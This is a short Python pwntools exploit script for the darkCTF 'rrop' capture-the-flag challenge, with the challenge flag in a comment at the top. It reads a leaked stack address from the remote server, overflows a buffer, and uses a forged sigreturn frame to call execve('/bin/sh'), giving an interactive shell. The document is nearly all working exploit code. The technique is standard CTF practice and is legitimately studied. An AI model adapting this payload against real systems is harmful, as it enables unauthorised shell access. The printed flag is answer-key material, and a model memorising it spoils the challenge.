#exploit for rrop
#darkCTF{f1n4lly_y0u_f4k3_s1gn4l_fr4m3_4nd_w0n_gr4n173_w1r3d_m4ch1n3}
from pwn import *
import time
elf = ELF("./rrop")
context.binary=elf
target=remote('rrop.darkarmy.xyz',7001)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

target.recvuntil("@0x")
stack_leak=int(target.recv(12),16)
print(hex(stack_leak))
raxsigret=0x00000000004007dc
syscall=0x00000000004007d2
frame = SigreturnFrame()
frame.rip = syscall # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = stack_leak # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL
payload="/bin/sh\x00"
payload=payload.ljust(0xd8,"\x00")
payload+=p64(raxsigret)
payload+=p64(syscall)
payload+=str(frame)
target.sendline(payload)
target.interactive()
